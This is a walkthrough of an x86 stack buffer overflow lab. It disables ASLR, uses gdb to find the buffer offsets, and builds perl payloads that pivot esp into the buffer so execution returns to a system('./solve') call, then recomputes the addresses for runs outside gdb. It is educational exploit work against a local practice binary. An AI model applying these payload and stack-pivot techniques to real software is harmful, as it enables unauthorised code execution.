# Walkthrough for Part 1 (x86)

## Preparing the environment
Note the status of ASLR.
If it's not 0, disable it:

```bash
cat /proc/sys/kernel/randomize_va_space
echo 0 > /proc/sys/kernel/randomize_va_space
```

The program calls `system("./solve")` so I've created a simple program to test if the exploit works.
Compile it with `gcc solve.c -o solve`.

Ensure that the environment variables don't interfere with the stack.
GDB also sets some environment variables at startup, so we want to get rid of those as well.
You can ignore the source line if you don't have a `.gdbinit`:

```bash
env -i gdb /path/to/part0x01_x86
source ~/.gdbinit
unset env LINES
unset env COLUMNS
```

![Preparing the environment](/00.png)

## Looking at the binary
The `system(3)` call sequence begins at `0x80485e0 <main+138>`
This is our target.

Set a breakpoint after the `scanf(3)` call to follow what happens after the input.
Another breakpoint before the stack frame is cleaned up so that we can watch the buffer overflow:

```gdb
break *main + 94
break *main + 172
```

![Looking at the binary](/01.png)

## Test run with "test" as input
We find the string is read into `buffer` at `0xffffddcc`.
Also, `0x0b` (vertical tab) is placed at the start of the input string.
This means the `strcmp(3)` will never succeed.

![Test input](/02.png)

## Track down the buffer overflow
We can use `r < [input file]` to give gdb a file to use as `stdin`.
The breakpoint after `scanf(3)` is no longer useful.

```break
delete 1
```

### First payload (executed in the system shell)
```bash
perl -e 'print "A"x32' > payload_gdb.dat
```

![Payload 1](/03.png)

### Second payload
```bash
perl -e 'print "A"x16 . "B"x16' > payload_gdb.dat
```

![Payload 2](/04.png)

### Third payload
```bash
perl -e 'print "A"x16' > payload_gdb.dat
```

This one doesn't segfault, let's work from here.

![Payload 3](/05.png)

## Something *very* interesting to note about the program
At the end of `main()`, `ecx` gets loaded with value at `[ebp - 0x04] = [0xffffdde8 - 0x04] = [0xffffdde4] = 0xffffde00`.
After that, `leave` is called to clean up stack frame.
But after the stack frame is cleaned up, `esp` gets loaded with `ecx - 0x04 = 0xffffddfc`.

![Interesting part 1](/06.png)
![Interesting part 2](/07.png)
![Interesting part 3](/08.png)
![Interesting part 4](/09.png)

o_O

## Exploit time!
We obviously need to control `eip`.
This means we need to be able to have our payload value at the top of the stack right before `ret`.
Remembering the part above, we want to set `esp` to an address in `buffer`.
That way `ret` will pop a value that we can control as the return address.
We can calculate that `ecx` is loaded from the address `buffer + 0x18` (24 bytes past `buffer`).

```bash
perl -e 'print "A"x24 . "BBBB"' > payload_gdb.dat
```

![Exploit part 1](/0a.png)

Now we can set `esp` to be loaded with the address of `buffer + 1` to avoid the vertical tab.
Taking into account the `- 0x04`, `BBBB` needs to become `buffer + 0x01 + 0x04 = 0xffffddcc + 0x05 = 0xffffddd1`

```bash
perl -e 'print "A" . "CCCC" . "D"x 19 . "\xd1\xdd\xff\xff"' > payload_gdb.dat
```

![Exploit part 2](/0b.png)

Now we can test setting the return address we want:

```bash
perl -e 'print "A" . "\xe0\x85\x04\x08" . "D"x 19 . "\xd1\xdd\xff\xff"' > payload_gdb.dat
```

![Exploit part 4](/0c.png)

We notice when we try to `ret` into the target that `ebp` is set to `0x00` at the call to `leave`.
This is no good.
We can maintain the old `ebp` to have a valid stack frame at the `ret` by adding the value at the end of our payload.

```bash
perl -e 'print "A" . "\xe0\x85\x04\x08" . "D"x 19 . "\xd1\xdd\xff\xff" . "\xe8\xdd\xff\xff"' > payload_gdb.dat
```

![Exploit part 5](/0d.png)

## Testing outside of gdb
When we run outside of gdb, we see that the exploit is unusccessful.
Even though we clear the environment variables, we still see `SIGSEGV`.

![Testing exploit in a real environment](/0e.png)

`test.c` can be used to figure out the offset of the stack inside gdb vs outside gdb.
Compile it with `gcc test.c -m32 -o test0x01_x86`.
We need the name to be the same length so that the arguments on the stack are the same size.

![Getting the offset](/0f.png)

Inside gdb, `ebp` is at `0xffffddd8`.
Outside of gdb, `ebp` is at `0xffffde18` which is `0x40` higher in memory.
All of the old stack addresses need to be incremented accordingly.
The return address itself doesn't, since it's in the code, not the stack.
This means:

 * `ebp` becomes `0xffffdde8 + 0x40 = 0xffffde28`
 * the string is read into `buffer` at `0xffffddcc + 0x40 = 0xffffde0c`
 * `ecx` gets loaded with value at `[ebp - 0x04] = [0xffffde28 - 0x04] = [0xffffde24]`
 * `esp` gets loaded with `ecx - 0x04` like before
   * needs to become `buffer + 0x01 + 0x04 = 0xffffde0c + 0x05 = 0xffffde11`

We can now try a new payload:

```bash
perl -e 'print "A" . "\xe0\x85\x04\x08" . "C"x 19 . "\x11\xde\xff\xff" . "\x28\xde\xff\xff"' > payload.dat
```

If disabled, re-enable ASLR when done (enter the value `cat`ed earlier)

```bash
echo 2 > /proc/sys/kernel/randomize_va_space
```

![Success](/10.png)
